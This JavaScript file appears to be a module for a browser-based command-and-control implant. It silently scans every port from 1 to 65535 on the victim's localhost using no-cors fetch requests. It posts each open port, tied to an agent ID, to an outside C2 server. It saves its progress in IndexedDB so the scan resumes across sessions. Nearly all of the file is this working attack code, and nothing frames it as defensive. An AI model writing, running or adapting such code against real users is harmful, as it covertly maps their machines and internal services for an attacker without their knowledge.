function sendLocalhostResultToC2(data){
  fetch(C2_SERVER + '/module/localhost_port_scan/' + agentID, {
    body: data,
    method: 'POST'
  });
}


function sendLocalhostOpenPortToC2(p){
  data = new FormData();
  data.append('result', `| ${p} `)
  sendLocalhostResultToC2(data);
}

function localhostPortScanIncreaseAndScan(){
  localPortScanPort = localPortScanPort + 1;
  if(localPortScanPort > 65535){
    deregisterModule('localhost_port_scan');
    data = new FormData();
    data.append('result', `| COMPLETED`)
    sendLocalhostResultToC2(data);
    return; // no more
  }
  WriteIDB("localhost_port_scan", localPortScanPort);
  doLocalhostPortScan();
}

function doLocalhostPortScan(){
  fetch("http://127.0.0.1:" + localPortScanPort, {mode: 'no-cors'})
  .then(function(res){
    sendLocalhostOpenPortToC2(localPortScanPort);
    localhostPortScanIncreaseAndScan();
  })
  .catch(function(ex){
    localhostPortScanIncreaseAndScan();
  });
}

var localPortScanPort;

// wakes up the DB
WriteIDB("localhost_port_scan_init", 1);
// save module in list of extra_modules
registerModule('localhost_port_scan', null);
// check what last port scanned and resume
new Promise((res, rej) => {
  ReadIDB("localhost_port_scan", rej);
}).catch(function(p){
  if(p == undefined){
    localPortScanPort = 1;
  }else{
    localPortScanPort = p;
  }
  doLocalhostPortScan();
});
